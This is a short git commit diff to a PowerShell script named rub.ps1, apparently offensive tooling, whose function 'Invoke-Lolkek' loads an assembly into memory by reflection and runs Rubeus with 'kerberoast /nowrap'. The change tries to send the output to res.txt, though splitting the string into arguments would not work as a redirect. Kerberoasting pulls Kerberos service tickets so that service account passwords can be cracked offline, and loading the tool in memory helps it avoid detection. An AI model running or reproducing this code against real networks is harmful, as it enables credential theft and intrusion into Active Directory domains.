47bc3efc5d57993fca3e4a7fed4e8011795bb31b
br1337 <58513517+br1337@users.noreply.github.com>
2022-12-26 04:56:56 -0500

    Update rub.ps1

--- rub.ps1
+++ rub.ps1
@@ -6,6 +6,6 @@ function Invoke-Lolkek
 	$b.CopyTo($c)
 	[byte[]]$d = $c.ToArray()
 	$e = [System.Reflection.Assembly]::Load($d)
-	[Rubeus.Program]::Main("kerberoast /nowrap".Split())
+	[Rubeus.Program]::Main("kerberoast /nowrap > res.txt".Split())
 	
 }
